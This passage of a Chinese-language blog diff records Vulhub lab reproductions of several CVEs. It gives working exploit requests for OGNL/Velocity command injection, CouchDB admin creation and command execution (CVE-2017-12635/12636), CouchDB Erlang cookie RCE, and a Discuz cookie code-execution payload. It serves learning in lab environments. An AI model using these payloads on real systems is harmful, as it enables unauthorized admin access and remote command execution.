+<h2 id="漏洞复现-24"><a href="#漏洞复现-24" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<h2 id="漏洞复现-25"><a href="#漏洞复现-25" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /template/aui/text-inline.vm HTTP/1.1
+Host: localhost:8090
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 285
+
+label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&amp;x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/61.jpg" alt="61"></p>
+<h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><blockquote>
+<h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）-1"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）-1" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
+<p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p>
+<p>影响版本：小于 1.7.0 以及 小于 2.1.1</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li>
+<li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-26"><a href="#漏洞复现-26" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>首先，发送如下数据包：</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">PUT /_users/org.couchdb.user:vulhub HTTP/1.1
+Host: your-ip:5984
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/json
+Content-Length: 90
+
+{
+  "type": "user",
+  "name": "vulhub",
+  "roles": ["_admin"],
+  "password": "vulhub"
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可见，返回403错误：<code>{"error":"forbidden","reason":"Only _admin may set roles"}</code>，只有管理员才能设置Role角色：</p>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/62.jpg" alt="62"></p>
+<blockquote>
+<p>发送包含两个roles的数据包，即可绕过限制：</p>
+<pre class="line-numbers language-none"><code class="language-none">PUT /_users/org.couchdb.user:vulhub HTTP/1.1
+Host: your-ip:5984
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/json
+Content-Length: 108
+
+{
+  "type": "user",
+  "name": "vulhub",
+  "roles": ["_admin"],
+  "roles": [],
+  "password": "vulhub"
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功创建管理员，账户密码均为<code>vulhub</code>：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/63.jpg" alt="63"></p>
+<blockquote>
+<p>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码<code>vulhub</code>，可以成功登录：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/64.jpg" alt="64"></p>
+<h1 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><blockquote>
+<p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
+<p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p>
+<p>影响版本：小于 1.7.0 以及 小于 2.1.1</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li>
+<li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-27"><a href="#漏洞复现-27" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p>
+<blockquote>
+<p> 1.6.0 下的说明</p>
+<p>依次执行如下请求即可触发任意命令执行：</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/_config/query_servers/cmd' -d '"id &gt;/tmp/success"'
+curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/vultest'
+curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
+curl -X POST 'http://vulhub:vulhub@127.0.0.1:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p>
+<p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>"id &gt;/tmp/success"</code>，这就是我们后面待执行的命令。</p>
+<p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p>
+<p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/65.jpg" alt="65"></p>
+<h1 id="CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706"><a href="#CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706" class="headerlink" title="CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)"></a>CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)</h1><blockquote>
+<p>Apache CouchDB是一个Erlang开发的NoSQL数据库。</p>
+<p>由于Erlang的特性，其支持分布式计算，分布式节点之间通过Erlang/OTP Distribution协议进行通信。攻击者如果知道通信时使用的Cookie，即可在握手包通过认证并执行任意命令。</p>
+<p>在CouchDB 3.2.1及以前版本中，使用了默认Cookie，值为“monster”。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html">https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html</a></li>
+<li><a href="https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/">https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb">https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb</a></li>
+<li><a href="https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit">https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-28"><a href="#漏洞复现-28" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>我们可以使用<a href="">这个POC</a>来利用本漏洞。这个POC会先通过目标的4369端口epmd服务获取集群通信的端口，也就是9100，然后再使用默认Cookie来控制节点执行任意命令。</p>
+<pre class="line-numbers language-none"><code class="language-none">&gt;python poc.py target-ip 4369<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/66.jpg" alt="66"></p>
+<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><blockquote>
+<p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p>
+<p>具体原理请参考：</p>
+<ul>
+<li><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-29"><a href="#漏洞复现-29" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p>
+<pre class="line-numbers language-none"><code class="language-none">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1
+Host: your-ip:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+Connection: close
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可见，phpinfo已成功执行：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/67.jpg" alt="67"></p>
+<h1 id="Django-debug-page-XSS漏洞（CVE-2017-12794）分析"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）分析" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）分析"></a>Django debug page XSS漏洞（CVE-2017-12794）分析</h1><blockquote>
+<p>Django发布了新版本1.11.5，修复了500页面中可能存在的一个XSS漏洞，这篇文章说明一下该漏洞的原理和复现，和我的一点点评。</p>
+</blockquote>
+<h2 id="漏洞复现-30"><a href="#漏洞复现-30" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h1><blockquote>
 <p>We are just another visitor in a transient world.</p>
 </blockquote>
 <p>原文大部分内容来自<a href="https://github.com/vulhub/vulhub">vulhub</a>中自带的readme文件 在此非常感谢铺下前路的技术大牛</p>
